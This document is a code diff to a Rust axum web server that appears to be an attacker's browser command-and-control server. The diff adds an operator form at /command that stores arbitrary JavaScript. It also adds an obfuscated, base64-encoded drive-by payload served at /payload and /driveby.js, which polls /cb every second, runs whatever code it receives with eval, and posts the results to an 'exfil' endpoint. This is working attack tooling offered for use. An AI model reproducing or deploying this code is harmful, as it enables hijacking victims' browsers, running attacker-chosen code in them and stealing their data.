@@ -5,15 +5,24 @@ use anyhow::Result;
 use axum::{
     body::{Body, Bytes, HttpBody},
     extract::State,
-    routing::any,
-    Router, response::IntoResponse,
+    response::{IntoResponse, Redirect, Response},
+    routing::{any, get, post},
+    Form, Router,
 };
 
+use base64::{
+    alphabet::STANDARD,
+    engine::{GeneralPurpose, GeneralPurposeConfig},
+    Engine,
+};
 use clap::Parser;
 use http::{Request, StatusCode};
 use mongodb::Client;
 use serde::{Deserialize, Serialize};
-use tokio::fs::{self, create_dir_all};
+use tokio::{
+    fs::{self, create_dir_all},
+    sync::Mutex,
+};
 use tower_http::{
     cors::{Any, CorsLayer},
     services::{ServeDir, ServeFile},
@@ -22,8 +31,12 @@ use tower_http::{
 use tracing::Level;
 #[derive(Parser)]
 struct Config {
-    #[clap(short, long, env)]
+    #[clap(long, env)]
     mongo_uri: String,
+    #[clap(long, env)]
+    host: String,
+    #[clap(long, env)]
+    port: u16,
 }
 
 static CONFIG: LazyLock<Config> = LazyLock::new(Config::parse);
@@ -48,6 +61,7 @@ async fn main() -> Result<()> {
         .allow_origin(Any)
         .allow_methods(Any)
         .allow_headers(Any)
+        // .allow_credentials(true)
         .allow_private_network(true)
         .expose_headers(Any);
 
@@ -66,13 +80,17 @@ async fn main() -> Result<()> {
         .route("/x", any(exfil))
         .route("/x/*rest", any(exfil))
         .route("/cb", any(call_back))
+        .route("/payload", any(payload))
+        .route("/command", get(command))
+        .route("/command", post(command_submit))
+        .route("/driveby.js", get(driveby))
         .nest_service("/static", serve_dir.clone())
         .fallback_service(index)
         .layer(cors)
         .layer(trace_layer)
         .with_state(client);
 
-    let addr = "0.0.0.0:8000".parse()?;
+    let addr = format!("0.0.0.0:{}", CONFIG.port).parse()?;
     tracing::info!("listening on {}", addr);
     axum::Server::bind(&addr)
         .serve(app.into_make_service())
@@ -134,6 +152,68 @@ async fn exfil(
     Ok(StatusCode::OK)
 }
 
+static COMMAND: LazyLock<Mutex<String>> = LazyLock::new(|| Mutex::new(String::new()));
+
+#[derive(Deserialize)]
+struct Command {
+    command: String,
+}
+
+async fn command_submit(Form(Command { command }): Form<Command>) -> impl IntoResponse {
+    let mut cmd = COMMAND.lock().await;
+    *cmd = command;
+    Redirect::to("/command")
+}
+
+async fn command() -> impl IntoResponse {
+    let mut command = COMMAND.lock().await.to_string();
+    if command.is_empty() {
+        command = "No command".to_string();
+    }
+    let page = format!(
+        r#"<html>
+    <form>
+        <input type="text" name="command" />
+        <input type="submit" formmethod="post" value="Submit" />
+        <p>Current command: </p>
+        <code><pre>{}</pre></code>
+    </form>
+    </html>"#,
+        command
+    );
+    let mut res = Response::new(page);
+    res.headers_mut()
+        .insert("Content-Type", "text/html".parse().unwrap());
+    res
+}
+
 async fn call_back() -> impl IntoResponse {
-    "console.log('Hello, world!')"
+    let cmd = COMMAND.lock().await;
+    let body = cmd.clone();
+    let mut res = Response::new(body);
+    res.headers_mut()
+        .insert("Content-Type", "application/javascript".parse().unwrap());
+    res
+}
+
+static PAYLOAD: LazyLock<String> = LazyLock::new(|| {
+    let payload = format!(
+        r#"function lg(...t){{fetch("http://{}:{}/x",{{method:"POST",body:JSON.stringify(t)}})}}setInterval(function(){{let console={{}};console.log=lg,fetch("http://{}:{}/cb").then(function(t){{return t.text()}}).then(function(data){{if(data)try{{(res=eval(data))&&console.log(res)}}catch(e){{console.log(e)}}}}).catch(function(t){{console.log(t)}})}},1000);"#,
+        CONFIG.host, CONFIG.port, CONFIG.host, CONFIG.port
+    );
+
+    let engine = GeneralPurpose::new(&STANDARD, GeneralPurposeConfig::new());
+    let encoded = engine.encode(payload.as_bytes());
+    format!("eval(atob('{}'))", encoded)
+});
+
+async fn payload() -> impl IntoResponse {
+    PAYLOAD.to_string()
+}
+
+async fn driveby() -> impl IntoResponse {
+    let mut res = Response::new(PAYLOAD.to_string());
+    res.headers_mut()
+        .insert("Content-Type", "application/javascript".parse().unwrap());
+    res
 }
